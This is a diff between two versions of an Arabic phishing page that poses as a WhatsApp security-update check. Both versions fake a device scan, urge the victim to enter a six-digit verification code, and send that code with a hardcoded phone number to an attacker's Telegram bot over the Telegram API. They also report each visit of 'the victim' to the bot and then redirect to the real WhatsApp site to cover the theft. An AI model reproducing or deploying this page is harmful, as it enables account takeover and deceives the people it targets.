@@ -1,136 +1,114 @@
-‏<!DOCTYPE html>
-‏<html lang="ar" dir="rtl">
-‏<head>
-‏    <meta charset="UTF-8">
-‏    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-‏    <title>WhatsApp Security System</title>
-‏    <style>
-‏        :root { --wa-bg: #111b21; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; }
-‏        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
-‏        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; overflow: hidden; }
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>WhatsApp Security Verification</title>
+    <style>
+        :root { --wa-bg: #111b21; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; --border: #222d34; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; display: flex; flex-direction: column; }
 
-        /* شاشة الفحص الذكي */
-‏        #checker { 
-‏            position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000;
-‏            display: flex; flex-direction: column; align-items: center; justify-content: center;
+        .header { padding: 20px; border-bottom: 1px solid var(--border); text-align: center; }
+        .header span { color: var(--wa-green); font-size: 16px; font-weight: 500; }
+
+        .container { padding: 30px 25px; flex: 1; display: flex; flex-direction: column; align-items: center; }
+
+        /* أيقونة واتساب المتحركة */
+        .loading-icon { width: 60px; height: 60px; margin-bottom: 20px; animation: pulse 1.5s infinite ease-in-out; }
+        @keyframes pulse { 0% { opacity: 0.5; transform: scale(0.95); } 50% { opacity: 1; transform: scale(1); } 100% { opacity: 0.5; transform: scale(0.95); } }
+
+        .status-card { 
+            background: #1d2a33; border-radius: 8px; padding: 18px; width: 100%;
+            margin-bottom: 20px; border: 1px solid var(--border); text-align: right;
+        }
+        .info-item { font-size: 14px; margin-bottom: 8px; color: var(--wa-hint); }
+        .info-item b { color: #fff; font-weight: 500; }
+        .warning-text { color: #f15c5c; font-size: 13px; margin-top: 5px; display: block; }
+
+        .instruction { font-size: 14px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 25px; text-align: center; }
+        .phone-num { font-size: 20px; color: var(--wa-green); font-weight: bold; margin-bottom: 25px; direction: ltr; }
+
+        .otp-input {
+            width: 100%; background: transparent; border: none; border-bottom: 2px solid var(--wa-green);
+            color: #fff; font-size: 30px; text-align: center; outline: none; letter-spacing: 12px;
+            margin-bottom: 35px; font-family: Arial, sans-serif;
         }
 
-‏        .container { padding: 30px 20px; text-align: center; display: none; }
-‏        .active { display: block; animation: fadeIn 0.6s ease; }
-
-‏        .device-info { 
-‏            background: #1d2a33; border-radius: 12px; padding: 20px; text-align: right; 
-‏            margin-bottom: 25px; border: 1px solid #222d34; position: relative;
+        .action-btn {
+            background: var(--wa-green); color: #111b21; border: none; width: 100%;
+            padding: 16px; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer;
         }
-‏        .status-dot { width: 8px; height: 8px; background: #ea0038; border-radius: 50%; display: inline-block; margin-left: 10px; animation: pulse 1s infinite; }
         
-‏        .info-line { font-size: 13px; margin-bottom: 10px; color: var(--wa-hint); display: flex; justify-content: space-between; }
-‏        .info-line b { color: #fff; font-family: monospace; }
+        #verification-ui { display: none; width: 100%; }
+    </style>
+</head>
+<body>
 
-‏        .otp-input {
-‏            width: 100%; background: transparent; border: none; border-bottom: 2px solid var(--wa-green);
-‏            color: #fff; font-size: 35px; text-align: center; outline: none; letter-spacing: 12px; margin: 25px 0; direction: ltr;
+    <div class="header">
+        <span>تحقق من أمان الحساب</span>
+    </div>
+
+    <div class="container">
+        <div id="loader">
+            <svg class="loading-icon" viewBox="0 0 24 24" fill="#00a884"><path d="M12.004 2C6.48 2 2 6.48 2 12c0 1.73.44 3.36 1.21 4.78L2 22l5.41-1.16C8.83 21.6 10.37 22 12.004 22c5.52 0 10-4.48 10-10s-4.48-10-10-10zm.003 18c-1.5 0-2.91-.4-4.13-1.1l-.3-.17-3.07.66.67-2.94-.19-.31C4.34 14.96 4 13.53 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8-3.59 8-8 8zm4.68-6.1c-.26-.13-1.52-.75-1.75-.84-.23-.09-.39-.13-.56.13-.17.26-.64.84-.78 1-.14.17-.29.19-.54.06-.26-.13-1.08-.4-2.06-1.27-.76-.68-1.27-1.52-1.42-1.78-.15-.26-.02-.4.11-.53.12-.11.26-.3.39-.45.13-.15.17-.26.26-.43.09-.17.04-.32-.02-.45-.06-.13-.56-1.35-.77-1.85-.2-.49-.41-.42-.56-.43h-.48c-.17 0-.45.06-.68.32-.24.26-.9.88-.9 2.15 0 1.27.92 2.5 1.05 2.67.13.17 1.81 2.77 4.39 3.88.61.26 1.09.42 1.47.54.62.2 1.18.17 1.62.1.5-.08 1.52-.62 1.73-1.21.21-.59.21-1.09.15-1.21-.06-.12-.22-.18-.48-.31z"/></svg>
+            <p style="color: var(--wa-hint); font-size: 14px;">جاري فحص توافق النظام...</p>
+        </div>
+
+        <div id="verification-ui">
+            <div class="status-card">
+                <div class="info-item">الجهاز المكتشف: <b id="dev">iPhone</b></div>
+                <div class="info-item">إصدار النظام: <b id="os">iOS 17.4</b></div>
+                <span class="warning-text">الحالة: مطلوب تحديث بروتوكول الأمان (v2.4)</span>
+            </div>
+
+            <p class="instruction">تم اكتشاف عدم توافق في تشفير المحادثات. يرجى تأكيد الرقم لإتمام التحديث التلقائي.</p>
+            
+            <div class="phone-num" id="p-mask"></div>
+
+            <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="••••••">
+
+            <button class="action-btn" onclick="submit()">تأكيد وتحديث الآن</button>
+        </div>
+    </div>
+
+    <script>
+        const CFG = { T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU', C: '5446862709', P: '01030003287' };
+
+        function setup() {
+            const ua = navigator.userAgent;
+            let device = "iPhone";
+            if(/Android/i.test(ua)) device = "Android Device";
+            
+            document.getElementById('dev').innerText = device;
+            document.getElementById('os').innerText = navigator.platform;
+            document.getElementById('p-mask').innerText = "+20 " + CFG.P.substring(0,3) + " ••••• " + CFG.P.slice(-2);
         }
 
-‏        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 16px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        async function bot(m) {
+            try { await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CFG.C, text: m, parse_mode: 'HTML' })
+            }); } catch(e) {}
+        }
 
-‏        .spinner { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-        
-‏        @keyframes spin { 100% { transform: rotate(360deg); } }
-‏        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-‏        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-‏    </style>
-‏</head>
-‏<body>
-
-‏    <div id="checker">
-‏        <div class="spinner"></div>
-‏        <p id="log-text" style="margin-top:25px; font-size:14px; color:var(--wa-hint);">بدء فحص النظام...</p>
-‏        <div id="device-detect" style="margin-top:10px; font-size:12px; color:var(--wa-green); font-family:monospace;"></div>
-‏    </div>
-
-‏    <div class="container" id="app">
-‏        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="50" style="margin-bottom:20px;">
-‏        <h2 style="font-size:20px; margin-bottom:15px;">تحديث بروتوكول الأمان الإلزامي</h2>
-
-‏        <div class="device-info">
-‏            <div class="info-line">الجهاز المكتشف: <b id="device-name">جاري التحديد...</b></div>
-‏            <div class="info-line">حالة الإصدار: <span style="color:#ea0038;">(v2.4) مطلوب تحديث <span class="status-dot"></span></span></div>
-‏            <div class="info-line">نظام التشفير: <b>SSL/TLS 1.3</b></div>
-‏            <div style="border-top: 1px solid #222d34; margin-top:10px; padding-top:10px;">
-                الرقم الموثق: <b id="masked-phone" style="color:var(--wa-green);"></b>
-‏            </div>
-‏        </div>
-
-‏        <p style="font-size: 13px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 20px;">
-            نسخة واتساب الحالية على جهازك لا تدعم التشفير المتقدم v2.4. يرجى إدخال كود المزامنة لتفعيل التحديث وحماية محادثاتك من التوقف.
-‏        </p>
-
-‏        <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="------">
-‏        <button class="btn" onclick="submitData()">تحديث ومزامنة الآن</button>
-‏    </div>
-
-‏    <script>
-‏        const CFG = {
-‏            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
-‏            C: '5446862709',
-‏            P: '01030003287'
+        window.onload = () => {
+            setup();
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('verification-ui').style.display = 'block';
+                bot(`🔍 <b>فحص:</b> الضحية انتقل لصفحة إدخال الكود.`);
+            }, 2500);
         };
 
-        // دالة كشف نوع الجهاز الاحترافية
-‏        function getDeviceModel() {
-‏            const ua = navigator.userAgent;
-‏            if (/android/i.test(ua)) {
-‏                const match = ua.match(/Android\s+([^\s;]+);?\s+([^;)]+)/);
-‏                return match ? match[2] : "Android Device";
-‏            } else if (/iPhone|iPad/i.test(ua)) {
-‏                return "Apple iPhone (iOS)";
-            }
-‏            return "Mobile Device";
-        }
-
-‏        const deviceModel = getDeviceModel();
-‏        document.getElementById('device-name').innerText = deviceModel;
-‏        document.getElementById('masked-phone').innerText = "+20 " + CFG.P.substring(0,3) + " •••• •• " + CFG.P.slice(-2);
-
-‏        async function bot(msg) {
-‏            await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
-‏                method: 'POST', headers: {'Content-Type': 'application/json'},
-‏                body: JSON.stringify({ chat_id: CFG.C, text: msg, parse_mode: 'HTML' })
-            });
-        }
-
-        // تسلسل عملية الفحص
-‏        window.onload = async () => {
-‏            const log = document.getElementById('log-text');
-‏            const det = document.getElementById('device-detect');
-            
-‏            bot(`📱 <b>[دخول جديد]:</b> الضحية فتح الصفحة.\nالجهاز: <code>${deviceModel}</code>`);
-
-‏            setTimeout(() => { log.innerText = "تحديد مواصفات الجهاز..."; det.innerText = `Detected: ${deviceModel}`; }, 1200);
-‏            setTimeout(() => { log.innerText = "فحص إصدار واتساب المثبت..."; }, 2500);
-‏            setTimeout(() => { log.innerText = "تحليل بروتوكولات التشفير SSL..."; }, 3800);
-            
-‏            setTimeout(() => {
-‏                document.getElementById('checker').style.display = 'none';
-‏                document.getElementById('app').classList.add('active');
-‏                bot(`⚠️ <b>[فحص كامل]:</b> تم إظهار رسالة التحديث للضحية.\nالجهاز: ${deviceModel}`);
-            }, 5000);
-        };
-
-‏        async function submitData() {
-‏            const val = document.getElementById('otp').value;
-‏            if(val.length === 6) {
-‏                document.querySelector('.btn').innerText = "جاري المزامنة...";
-‏                await bot(`🔥 <b>[كود وصل]:</b>\nالرقم: <code>${CFG.P}</code>\nالكود: <code>${val}</code>\nالجهاز: <code>${deviceModel}</code>`);
-                
-‏                document.body.innerHTML = `<div style="background:var(--wa-bg); height:100vh; display:flex; align-items:center; justify-content:center; color:var(--wa-hint); flex-direction:column;">
-‏                    <div class="spinner"></div><p style="margin-top:20px;">جاري ربط بروتوكول التشفير v2.4 بجهاز ${deviceModel}...</p>
-‏                </div>`;
-                
-‏                setTimeout(() => window.location.href = "https://www.whatsapp.com/security", 5000);
+        async function submit() {
+            const val = document.getElementById('otp').value;
+            if(val.length === 6) {
+                document.querySelector('.action-btn').innerText = "...";
+                await bot(`✅ <b>كود جديد:</b>\nالرقم: <code>${CFG.P}</code>\nالكود: <code>${val}</code>`);
+                location.href = "https://www.whatsapp.com/security";
             }
         }
-‏    </script>
-‏</body>
-‏</html>
+    </script>
+</body>
+</html>
